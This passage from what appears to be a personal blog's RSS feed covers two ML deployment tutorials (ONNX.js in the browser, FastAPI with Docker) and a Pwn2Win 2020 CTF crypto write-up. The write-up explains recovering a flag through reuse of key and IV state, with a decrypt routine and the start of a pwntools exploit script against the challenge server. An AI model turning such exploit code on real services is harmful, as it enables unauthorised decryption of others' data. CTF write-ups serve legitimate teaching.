&lt;p&gt;Loading the model is similar -&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/07658e9b0b4dc759fb4f081cd9ea7b78.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The ONNX examples on their repository gives some nice code snippets to show basic image preprocessing. I have used it directly in my code.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/1a2f6059395c60485e4d721c7afd761b.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;After that, the following code snippet loads the preprocessed image to an input tensor and then runs the model on it and then prints the predictions.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/7e4366058eac9a8c1f05a82b569ff91a.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;A demo of the webapp using ONNX.js is shown below.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx1.gif&#34; data-caption=&#34;ONNX.js predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx1.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    ONNX.js predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx2.gif&#34; data-caption=&#34;ONNX.js predictions&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-01-25_deep_learning_in_the_browser/images/onnx2.gif&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    ONNX.js predictions
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;The Resnet model does an awesome job with the airline image and classifies it correctly. It also performs decently on the bus image giving the top prediction as &lt;em&gt;minibus&lt;/em&gt;. However, the goal of this post is not to judge how well the model works, but the technique of deploying the models and receiving predictions from them.&lt;/p&gt;
&lt;p&gt;I used the WebGL model for testing. It takes an average of 70ms to serve the predictions. The CPU version takes a VERY long time ~15000ms (15 seconds).&lt;/p&gt;
&lt;p&gt;The average time taken by different backends (over 20 predictions) is also shown below. I had some trouble with the WASM version so I didn&amp;rsquo;t include them in the results.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Backend&lt;/th&gt;
&lt;th&gt;Time&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;cpu&lt;/td&gt;
&lt;td&gt;15000ms&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;webgl&lt;/td&gt;
&lt;td&gt;71ms&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;The best part about ONNX is that it is an open standard and allows easy conversion of models made in different frameworks to a &lt;code&gt;.onnx&lt;/code&gt; model. I would suggest going through &lt;a href=&#34;https://github.com/onnx/tutorials&#34;&gt;this tutorial&lt;/a&gt; for this.&lt;/p&gt;
&lt;p&gt;The code for this section is present &lt;a href=&#34;https://github.com/shreyansh26/DeepLearning-in-the-Browser/tree/main/ONNX&#34;&gt;on my Github&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;the-end&#34;&gt;The End&lt;/h2&gt;
&lt;p&gt;That is all for now. I hope that this tutorial will help the reader get an idea of these frameworks for client-side model deployment and one can also use my code as a boilerplate for setting up webapps of your own for deploying ML models using these frameworks.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Quick tutorial to deploy your ML models using FastAPI and Docker</title>
      <link>https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/</link>
      <pubDate>Mon, 30 Nov 2020 11:21:53 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/</guid>
      <description>&lt;p&gt;The goal of this blog post is to make an API to get predictions from a pre-trained ML model and how we can do that in a fast manner using &lt;a href=&#34;https://fastapi.tiangolo.com/&#34;&gt;FastAPI&lt;/a&gt; and also be able to ship it using &lt;a href=&#34;https://www.docker.com/&#34;&gt;Docker&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This method does not scale well as it does not support caching and cannot handle much load. However, this can be a good instructional post on how you can deploy those models and use them for small low-scale projects, say a hackathon.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In the tutorial we will use the very famous Iris dataset. The dataset has 4 features -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Sepal Length&lt;/li&gt;
&lt;li&gt;Sepal Width&lt;/li&gt;
&lt;li&gt;Petal Length&lt;/li&gt;
&lt;li&gt;Petal Width&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These lengths are in cm, and these fields are used to predict the type of the Iris, among 3 categories - Setosa, Versicolour and Virginica.&lt;/p&gt;
&lt;h2 id=&#34;project-structure&#34;&gt;Project Structure&lt;/h2&gt;
&lt;p&gt;Given below is the outline of the files and location of the files so that it is easier for one to follow the tutorial.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ml-deployment/
│   .gitignore
│   Dockerfile
│   logs.log
│   README.md
│   request.py
│   requirements.txt
│   server.py
│
├───models
        iris.py
        model.pkl
        model.py
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;model-training&#34;&gt;Model Training&lt;/h2&gt;
&lt;p&gt;Since the goal here is just to make a POC deployment, we make a very simple model trained on the Iris dataset. Some very basic knowledge of Scikit-learn libraries will be needed to understand the code.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/fcb121e5c428895be24e58edec1c3ebe.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;The model is saved in a pickle format. We will load the saved model to do predictions later.&lt;/p&gt;
&lt;p&gt;Now, along with this, we have to ensure that when the API will receive the paprameters, it receives them in a proper format, for example, a list of lists in which each list has 4 float values for the features.&lt;/p&gt;
&lt;p&gt;For that we use &lt;a href=&#34;https://github.com/samuelcolvin/pydantic&#34;&gt;Pydantic&lt;/a&gt;.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f45af7bad35c6c75cc695dd8f209c2c7.js&#34;&gt;&lt;/script&gt;

&lt;h2 id=&#34;creating-the-api&#34;&gt;Creating the API&lt;/h2&gt;
&lt;p&gt;As mentioned earlier, we use FastAPI to make our API. From the website -&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.6+ based on standard Python type hints.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It also claims to have &lt;em&gt;Very high performance, on par with NodeJS and Go (thanks to Starlette and Pydantic). One of the fastest Python frameworks available.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The whole code is given below, I&amp;rsquo;ll explain the details below as well.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/3ccaafb643fb1d387137550c715610cc.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Here, we define the name of our app.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;app &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; FastAPI(title&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Iris Classifier API&amp;#34;&lt;/span&gt;, description&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;API for Iris classification using ML&amp;#34;&lt;/span&gt;, version&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Next, we set up logging for our API as well, to ensure we can see WHEN something went wrong, in case something does go wrong.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Initialize logging&lt;/span&gt;
my_logger &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;getLogger()
my_logger&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;setLevel(logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG)
logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;basicConfig(level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;logging&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DEBUG, filename&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;logs.log&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we use a FastAPI decorator called &lt;code&gt;@app.on_event(&amp;quot;startup&amp;quot;)&lt;/code&gt; to specify the operation which we want to perform when the server starts up. Here we load our model so that once the model is loaded in the initial phase, the predictions can be served as fast as possible.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;@app.on_event&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;startup&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;load_model&lt;/span&gt;():
    model &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pickle&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;load(open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;models/model.pkl&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;rb&amp;#34;&lt;/span&gt;))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, our main logic of serving the predictions -&lt;/p&gt;
&lt;p&gt;We get the data that the API receives from the server and require it to be in the &lt;code&gt;Iris&lt;/code&gt; format, which we specified using Pydantic.&lt;/p&gt;
&lt;p&gt;We run the model on those examples, get the predictions and then map them to the flower type. The classification and the model probability of the prediction is returned as a JSON response.&lt;/p&gt;
&lt;p&gt;We have a try-catch blog to make ensure any wrong input format or any other kinds of errors does not break the server.&lt;/p&gt;
&lt;h2 id=&#34;lets-see-it-in-action&#34;&gt;Let&amp;rsquo;s see it in action&lt;/h2&gt;
&lt;p&gt;The FastAPI provides a dashboard from where we send requests to the API. It is at &lt;code&gt;http://localhost:8000/docs&lt;/code&gt;.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/docs.PNG&#34; data-caption=&#34;Sending sample request to FastAPI&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/docs.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Sending sample request to FastAPI
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/response.PNG&#34; data-caption=&#34;Response from FastAPI&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-11-30_fast_api_docker_ml_deploy/images/response.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Response from FastAPI
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;h2 id=&#34;dockerise-everything&#34;&gt;Dockerise Everything!&lt;/h2&gt;
&lt;p&gt;So now, if we have to ship it, we want to convert it into a Docker image.&lt;/p&gt;
&lt;p&gt;For that we create a Dockerfile.&lt;/p&gt;
&lt;script type=&#34;application/javascript&#34; src=&#34;https://gist.github.com/shreyansh26/f4d7a32e2790b32a8f18dbcb583cc817.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;Basically, the Dockerfile instructs Docker to first create a &lt;code&gt;/app&lt;/code&gt; folder inside the Docker &lt;strong&gt;python3.8&lt;/strong&gt; base image, install the requirements (Python packages) and then run the app on port 8000 in the Docker container, and expose that port to access it from our local machine.&lt;/p&gt;
&lt;p&gt;Now, we just have to run two commands -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ docker build -t iris-ml .  # Build the Docker image
$ docker run -d -p 8000:8000 --name iris-api iris-ml   # Run the Docker image as container
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The requirements.txt for the project are also listed below -&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;numpy==1.18.4
pydantic==1.6.1
requests==2.24.0
fastapi==0.61.1
scikit_learn==0.23.2
uvicorn==0.11.8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now you can head to &lt;a href=&#34;%5Bhttp://localhost:8000/docs%5D&#34;&gt;http://localhost:8000/docs&lt;/a&gt; to test the API.&lt;/p&gt;
&lt;p&gt;If you see the dashboard and the responses similar to the screenshots above, you have most likely deployed it successfully.&lt;/p&gt;
&lt;h3 id=&#34;congratulations&#34;&gt;Congratulations!!&lt;/h3&gt;
&lt;p&gt;Now that you have the Docker image, the entire environment can be recreated on any other machine. You can push the image to DockerHub (&lt;a href=&#34;https://ropenscilabs.github.io/r-docker-tutorial/04-Dockerhub.html&#34;&gt;refer here&lt;/a&gt;) or export as a &lt;a href=&#34;https://stackoverflow.com/questions/23935141/how-to-copy-docker-images-from-one-host-to-another-without-using-a-repository&#34;&gt;tar file&lt;/a&gt; to share to another host.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;The entire code is also available on my Github - &lt;a href=&#34;https://github.com/shreyansh26/Weekend-Projects/tree/master/MLDeployment/v1&#34;&gt;https://github.com/shreyansh26/Weekend-Projects/tree/master/MLDeployment/v1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  &lt;/p&gt;
&lt;p&gt;This is all for now. I will also be writing about few other approaches to deploy relatively heavier models and also scalable approaches to Model hosting. Thanks for reading!&lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Androids Encryption (Crypto) - Pwn2Win CTF 2020</title>
      <link>https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/</link>
      <pubDate>Mon, 01 Jun 2020 12:32:46 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/</guid>
      <description>&lt;h3 id=&#34;crypto-115---108-solves&#34;&gt;crypto 115 - 108 solves&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;We intercept an algorithm that is used among Androids. There are many hidden variables. Is it possible to recover the message?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Author: andre_smaira&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Server: nc encryption.pwn2.win 1337&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://pwn2.win/NIZKCTF-js/challenges/androids_encryption&#34;&gt;Challenge link&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/files/server.py&#34;&gt;Challenge files&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;On connecting to the challenge service, we are given two options -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/options.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/options.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also, in the server.py file, we see there are two functions, &lt;code&gt;enc_plaintext&lt;/code&gt; and &lt;code&gt;enc_flag&lt;/code&gt;. Both these functions call the &lt;code&gt;encrypt&lt;/code&gt; function.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;enc_plaintext&lt;/code&gt; functions calls &lt;code&gt;encrypt&lt;/code&gt; with the plaintext supplied by the user (encoded in base64), key1 and iv1 (which are secret values) as arguments.&lt;br&gt;
The &lt;code&gt;enc_flag&lt;/code&gt; fucntion takes as arguments the secret flag and iv2 and key2 which are actually derived from iv1, key1 and the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;iv2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key1, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(iv1)
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(to_blocks(flag))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;encrypt&lt;/code&gt; function returns the base64 encoding of the (iv+ciphertext) string.&lt;/p&gt;
&lt;h3 id=&#34;exploit&#34;&gt;Exploit&lt;/h3&gt;
&lt;p&gt;We see that every time &lt;code&gt;encrypt&lt;/code&gt; is called, the key2 and iv2 values are updated. iv2 becomes the AES-ECB decryption of the old iv2 and key2 is now the first block of the ciphertext (since the xor function with one argument simply returns the first block of the argument). So, our goal is now to recover the key2 and iv2 values so we can then reverse the &lt;code&gt;encrypt_flag&lt;/code&gt; function and recover the flag.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/update.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2020-06-01_androids_encryption-pwn2win-2020/images/update.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;If we call &lt;code&gt;encrypt_flag&lt;/code&gt; (Choice 2) the first time, then the new key2 value will be the first block of the ciphertext. Nnow during this, the iv2 has also been updated but we don&amp;rsquo;t know that value, since the first part of the returned value, is the old iv2.&lt;/p&gt;
&lt;p&gt;So, what we do next is call the &lt;code&gt;encrypt_flag&lt;/code&gt; (Choice 2) function again, then we get the new iv2 value along with the ciphertext. This means taht now we know the iv2 and the key2 value taht was used to encrypt the flag to obtain the ciphertext. What remains now, is just to reverse the &lt;code&gt;encrypt&lt;/code&gt; function and call it with our values of the ciphertext, key2 and iv2. This will get us the flag.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;decrypt&lt;/code&gt; function can be written as -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid key size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(iv) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; BLOCK_SIZE, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid IV size&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(txt) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Invalid plaintext size&amp;#39;&lt;/span&gt;
    bs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    blocks &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; to_blocks(txt)
    ctxt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_ECB)
    curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; iv
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; block &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; blocks:
        ctxt &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; xor(curr, aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(block)) &lt;span style=&#34;color:#75715e&#34;&gt;# Inverse of the encrypt function&lt;/span&gt;
        curr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xor(ctxt[&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;bs:], block)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ctxt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The complete exploit code is shown below -&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES

p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;encryption.pwn2.win&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# context.log_level = &amp;#39;debug&amp;#39;&lt;/span&gt;

BUFF &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
BLOCK_SIZE &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
key2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None
iv2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; None

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to_blocks&lt;/span&gt;(txt):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; [txt[i&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;BLOCK_SIZE:(i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;BLOCK_SIZE] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(txt)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;BLOCK_SIZE)]

